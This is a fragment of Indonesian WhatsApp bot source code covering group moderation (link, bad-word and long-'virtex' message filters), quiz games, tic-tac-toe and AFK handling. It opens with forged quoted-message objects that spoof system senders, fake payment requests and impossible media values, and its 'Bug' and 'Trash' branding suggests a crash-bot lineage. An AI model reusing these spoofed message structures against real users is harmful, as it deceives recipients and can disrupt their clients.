participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - zxv`
}
}
}

const byxbut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const byxcakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` Abyy - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ 𝐀͢𝚋𝐘 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ 𝐀͢𝚋𝐘 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
//=================================================//
//Reply
const byxzreply = async (teks) => {
await sleep(500)
let thumbnails = [thumb]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return byxz.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `𝗔𝗹𝗯𝗲𝗿𝘁𝗧𝗿𝗮𝘀𝗵𝗫𝗢𝗖`,
body: ``,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://whatsapp.com/channel/0029Van86kL5Ui2SgngDlZ3W`,
mediaUrl: `https://whatsapp.com/channel/0029Van86kL5Ui2SgngDlZ3W`
}
},
text: teks
}, {
quoted: m
})
await sleep(500)
}
//=================================================//

// Anti Link
if (AntiLink) {
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return byxzreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await byxz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return byxz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return byxz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return byxz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
byxz.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
 // Antiwame by geekz and modified by thezetsuboxygen
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
kice = m.sender
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by thezetsuboxygen
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return byxzreply(mess.botAdmin)
  await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
byxz.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by geekz and modified by thezetsuboxygen
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiasing by geekz and modified by thezetsuboxygen
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isDeveloper) {
} else
await byxz.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by thezetsuboxygen
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by thezetsuboxygen
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by thezetsuboxygen
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by thezetsuboxygen
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by thezetsuboxygen
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by thezetsuboxygen
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by thezetsuboxygen
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by geekz and modified by thezetsuboxygen
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return byxzreply(bvl)
if (mek.key.fromMe) return byxzreply(bvl)
if (isDeveloper) return byxzreply(bvl)
await byxz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*byxz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
byxz.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//=================================================//

// GAME
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakgambar[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete kuismath[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxzreply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakasahotak[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksusunkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaksusunkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera2[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkabupaten[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkimia[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktekateki[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaktekateki[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaklagu[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebakkalimat[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaklirik[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await byxzreply('*Anda Telah menyerah*')
delete tebaktebakan[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await byxz.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else byxzreply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
byxzreply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
} [ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
} [v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['', ''][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
: @${room.game.playerX.split('@')[0]}
: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) byxz.sendText(room.x, str, m, {
mentions: parseMention(str)
})
byxz.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
byxzreply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('dtbs/afk-user.json', JSON.stringify(_afk))
byxz.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}

let anjay = `\``

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
byxz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
byxz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) byxz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) byxz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) byxz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
byxz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
byxzreply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
